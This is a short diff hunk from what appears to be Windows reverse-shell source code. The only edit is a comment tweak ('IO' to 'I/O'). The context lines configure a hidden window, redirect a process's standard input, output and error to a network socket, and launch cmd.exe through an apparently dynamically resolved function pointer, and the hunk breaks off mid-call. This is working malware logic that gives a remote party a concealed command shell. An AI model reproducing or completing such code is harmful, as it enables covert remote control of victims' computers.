@@ -116,7 +116,7 @@ int main(int argc, char* argv[]) {
     sui.cb = sizeof(sui); // Set size of the structure
     sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // Specify flags
     sui.wShowWindow = SW_HIDE; // Hide the window
-    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock; // Redirect IO to socket
+    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock; // Redirect I/O to socket
 
     // Create the cmd.exe process
     if (reinterpret_cast<BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
